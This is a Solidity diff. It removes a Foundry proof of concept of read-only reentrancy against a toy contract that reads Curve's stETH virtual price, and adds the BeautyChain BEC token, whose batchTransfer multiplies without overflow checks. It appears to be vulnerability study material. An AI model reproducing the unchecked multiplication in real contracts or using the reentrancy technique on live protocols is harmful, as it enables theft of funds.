@@ -1,135 +1,222 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.18;
+pragma solidity ^0.4.16;
 
-import "forge-std/Test.sol";
-import "./interface.sol";
-
-interface ICurve {
-    function get_virtual_price() external view returns (uint);
-
-    function add_liquidity(
-        uint[2] calldata amounts,
-        uint min_mint_amount
-    ) external payable returns (uint);
-
-    function remove_liquidity(
-        uint lp,
-        uint[2] calldata min_amounts
-    ) external returns (uint[2] memory);
-
-    function remove_liquidity_one_coin(
-        uint lp,
-        int128 i,
-        uint min_amount
-    ) external returns (uint);
-}
-
-address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
-address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token
-
-// CoreContract
-// users stake LP_TOKEN
-// getReward rewards the users based on the current price of the pool LP token
-contract CoreContract {
-    IERC20 public constant token = IERC20(LP_TOKEN);
-    ICurve private constant pool = ICurve(STETH_POOL);
-
-    mapping(address => uint) public balanceOf;
-
-    function stake(uint amount) external {
-        token.transferFrom(msg.sender, address(this), amount);
-        balanceOf[msg.sender] += amount;
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal constant returns (uint256) {
+        uint256 c = a * b;
+        require(a == 0 || c / a == b);
+        return c;
     }
 
-    function unstake(uint amount) external {
-        balanceOf[msg.sender] -= amount;
-        token.transfer(msg.sender, amount);
+    function div(uint256 a, uint256 b) internal constant returns (uint256) {
+        uint256 c = a / b;
+
+        return c;
     }
 
-    function getReward() external view returns (uint) {
-        //rewarding tokens based on the current virtual price of the pool LP token
-        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
-            1 ether;
-        // Omitting code to transfer reward tokens
-        return reward;
+    function sub(uint256 a, uint256 b) internal constant returns (uint256) {
+        require(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal constant returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a);
+        return c;
     }
 }
 
-contract OperatorContract {
-    ICurve private constant pool = ICurve(STETH_POOL);
-    IERC20 public constant lpToken = IERC20(LP_TOKEN);
-    CoreContract private immutable target;
+contract ERC20Basic {
+    uint256 public totalSupply;
 
-    constructor(address _target) {
-        target = CoreContract(_target);
+    function balanceOf(address who) public constant returns (uint256);
+
+    function transfer(address to, uint256 value) public returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
+
+contract BasicToken is ERC20Basic {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) balances;
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        require(_to != address(0));
+        require(_value > 0 && _value <= balances[msg.sender]);
+
+        balances[msg.sender] = balances[msg.sender].sub(_value);
+        balances[_to] = balances[_to].add(_value);
+        Transfer(msg.sender, _to, _value);
+        return true;
     }
 
-    // Stake LP into CoreContract
-    function stakeTokens() external payable {
-        uint[2] memory amounts = [msg.value, 0];
-        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
-        console.log(
-            "LP token price after staking into CoreContract",
-            pool.get_virtual_price()
-        );
-
-        lpToken.approve(address(target), lp);
-        target.stake(lp);
-    }
-
-    function performReadOnlyCallback() external payable {
-        // Add liquidity to Curve
-        uint[2] memory amounts = [msg.value, 0];
-        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
-        // Log get_virtual_price
-        console.log(
-            "LP token price before remove_liquidity()",
-            pool.get_virtual_price()
-        );
-        // Remove liquidity from Curve
-        // remove_liquidity() invokes the recieve() callback
-        uint[2] memory min_amounts = [uint(0), uint(0)];
-        pool.remove_liquidity(lp, min_amounts);
-        // Log get_virtual_price
-        console.log(
-            "--------------------------------------------------------------------"
-        );
-        console.log(
-            "LP token price after remove_liquidity()",
-            pool.get_virtual_price()
-        );
-
-        uint reward = target.getReward();
-        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
-    }
-
-    receive() external payable {
-        // receive() is called when the remove_liquidity is called
-        console.log(
-            "--------------------------------------------------------------------"
-        );
-        console.log(
-            "LP token price during remove_liquidity()",
-            pool.get_virtual_price()
-        );
-
-        uint reward = target.getReward();
-        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
+    function balanceOf(
+        address _owner
+    ) public constant returns (uint256 balance) {
+        return balances[_owner];
     }
 }
 
-contract OperatorTest is Test {
-    OperatorContract public execute;
-    CoreContract public target;
+contract ERC20 is ERC20Basic {
+    function allowance(
+        address owner,
+        address spender
+    ) public constant returns (uint256);
 
-    function setUp() public {
-        vm.createSelectFork("mainnet");
-        target = new CoreContract();
-        execute = new OperatorContract(address(target));
+    function transferFrom(
+        address from,
+        address to,
+        uint256 value
+    ) public returns (bool);
+
+    function approve(address spender, uint256 value) public returns (bool);
+
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+contract StandardToken is ERC20, BasicToken {
+    mapping(address => mapping(address => uint256)) internal allowed;
+
+    function transferFrom(
+        address _from,
+        address _to,
+        uint256 _value
+    ) public returns (bool) {
+        require(_to != address(0));
+        require(_value > 0 && _value <= balances[_from]);
+        require(_value <= allowed[_from][msg.sender]);
+
+        balances[_from] = balances[_from].sub(_value);
+        balances[_to] = balances[_to].add(_value);
+        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
+        Transfer(_from, _to, _value);
+        return true;
     }
 
-    function testExecution() public {
-        execute.stakeTokens{value: 10 ether}(); // stake 10 eth in CoreContract
-        execute.performReadOnlyCallback{value: 100000 ether}();
+    function approve(address _spender, uint256 _value) public returns (bool) {
+        allowed[msg.sender][_spender] = _value;
+        Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function allowance(
+        address _owner,
+        address _spender
+    ) public constant returns (uint256 remaining) {
+        return allowed[_owner][_spender];
+    }
+}
+
+contract Ownable {
+    address public owner;
+
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+
+    function Ownable() {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+
+    function transferOwnership(address newOwner) public onlyOwner {
+        require(newOwner != address(0));
+        OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }
+}
+
+contract Pausable is Ownable {
+    event Pause();
+    event Unpause();
+
+    bool public paused = false;
+
+    modifier whenNotPaused() {
+        require(!paused);
+        _;
+    }
+
+    modifier whenPaused() {
+        require(paused);
+        _;
+    }
+
+    function pause() public onlyOwner whenNotPaused {
+        paused = true;
+        Pause();
+    }
+
+    function unpause() public onlyOwner whenPaused {
+        paused = false;
+        Unpause();
+    }
+}
+
+contract PausableToken is StandardToken, Pausable {
+    function transfer(
+        address _to,
+        uint256 _value
+    ) public whenNotPaused returns (bool) {
+        return super.transfer(_to, _value);
+    }
+
+    function transferFrom(
+        address _from,
+        address _to,
+        uint256 _value
+    ) public whenNotPaused returns (bool) {
+        return super.transferFrom(_from, _to, _value);
+    }
+
+    function approve(
+        address _spender,
+        uint256 _value
+    ) public whenNotPaused returns (bool) {
+        return super.approve(_spender, _value);
+    }
+
+    function batchTransfer(
+        address[] _receivers,
+        uint256 _value
+    ) public whenNotPaused returns (bool) {
+        uint cnt = _receivers.length;
+        uint256 amount = uint256(cnt) * _value;
+        require(cnt > 0 && cnt <= 20);
+        require(_value > 0 && balances[msg.sender] >= amount);
+
+        balances[msg.sender] = balances[msg.sender].sub(amount);
+        for (uint i = 0; i < cnt; i++) {
+            balances[_receivers[i]] = balances[_receivers[i]].add(_value);
+            Transfer(msg.sender, _receivers[i], _value);
+        }
+        return true;
+    }
+}
+
+contract BecToken is PausableToken {
+    string public name = "BeautyChain";
+    string public symbol = "BEC";
+    string public version = "1.0.0";
+    uint8 public decimals = 18;
+
+    function BecToken() {
+        totalSupply = 7000000000 * (10 ** (uint256(decimals)));
+        balances[msg.sender] = totalSupply; // Give the creator all initial tokens
+    }
+
+    function() {
+        //if ether is sent to this address, send it back.
+        revert();
     }
 }
